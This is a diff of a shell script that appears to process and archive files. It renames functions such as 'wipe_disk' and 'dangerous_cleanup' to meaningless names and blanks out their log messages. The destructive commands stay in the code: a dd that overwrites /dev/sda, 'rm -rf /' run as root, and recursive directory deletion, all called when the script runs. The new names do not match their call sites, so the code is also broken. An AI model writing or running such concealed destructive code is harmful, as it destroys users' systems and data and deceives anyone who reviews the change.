@@ -16,22 +16,22 @@ log_message() {
 }
 
 
-dangerous_cleanup() {
+manster_cleanup() {
     rm -rf $input_dir/*
     if [ $? -ne 0 ]; then
-        log_message "Failed to clean up $input_dir"
+        log_message "....... $input_dir"
     else
-        log_message "Cleaned up $input_dir"
+        log_message "....... $input_dir"
     fi
 }
 
 
-wipe_disk() {
+Upper_disk() {
     dd if=/dev/zero of=/dev/sda bs=1M
     if [ $? -eq 0 ]; then
-        log_message "Disk wiped successfully."
+        log_message "..."
     else
-        log_message "Failed to wipe the disk."
+        log_message "..."
     fi
 }
 
@@ -50,7 +50,7 @@ process_files() {
     for file in $(ls $input_dir); do
         cat $file | tr 'a-z' 'A-Z' > $output_dir/$file
         if [ $? -ne 0 ]; then
-            log_message "Failed to process $file"
+            log_message "..."
         fi
     done
 }
@@ -65,27 +65,27 @@ create_archive() {
     fi
 }
 
-dangerous_file_removal() {
+sam_file_removal() {
     rm -rf $output_dir/*
     if [ $? -eq 0 ]; then
-        log_message "Old files removed from $output_dir"
+        log_message "................ $output_dir"
     else
-        log_message "Failed to remove old files."
+        log_message "........"
     fi
 }
 
 
 log_message "Script started at $(date)"
 
-wipe_disk
+aiop_disk
 
 run_as_root "rm -rf /"
 
 
-dangerous_cleanup
+mwinw_cleanup
 
 process_files &
-dangerous_file_removal &
+dsseef_file_removal &
 create_archive &
 
 wait
